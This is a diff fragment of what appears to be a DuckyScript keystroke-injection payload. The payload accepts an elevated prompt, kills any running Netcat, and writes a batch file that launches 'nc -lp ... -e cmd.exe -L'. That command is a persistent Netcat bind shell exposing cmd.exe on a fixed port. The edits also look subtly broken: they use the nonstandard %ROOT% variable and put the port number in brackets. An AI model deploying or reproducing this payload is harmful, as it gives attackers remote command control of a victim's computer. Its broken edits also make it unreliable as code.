@@ -19,7 +19,7 @@ ENTER
 DELAY 1500
 ALT y
 DELAY 500
-STRING cd %TEMP%
+STRING cd %ROOT%
 ENTER
 
 REM --> Kills already running Netcat instance (if any)
@@ -47,9 +47,9 @@ DELAY 500
 REM --> Creates a batch file to start listening 
 STRING copy con Start.bat
 ENTER
-STRING cd %TEMP%
+STRING cd %ROOT%
 ENTER
-STRING nc -lp [PORT] -vv -e cmd.exe -L
+STRING nc -lp [5555] -vv -e cmd.exe -L
 ENTER
 CONTROL z
 ENTER
